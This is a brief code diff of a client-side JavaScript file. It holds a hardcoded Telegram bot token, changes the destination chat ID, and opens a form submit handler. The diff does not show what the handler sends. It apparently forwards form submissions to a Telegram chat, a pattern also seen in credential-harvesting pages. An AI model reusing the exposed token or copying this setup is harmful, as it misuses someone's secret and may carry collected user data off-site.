@@ -3,7 +3,7 @@ const loading = document.getElementById('loading');
 const message = document.getElementById('message');
 
 const BOT_TOKEN = '8792828862:AAEUoHc06sXI1cG6OfIdRfZ0kSHiOwEMp9c';
-const CHAT_ID = '649056780';
+const CHAT_ID = '722433913';
 
 form.addEventListener('submit', async function (e) {
   e.preventDefault();
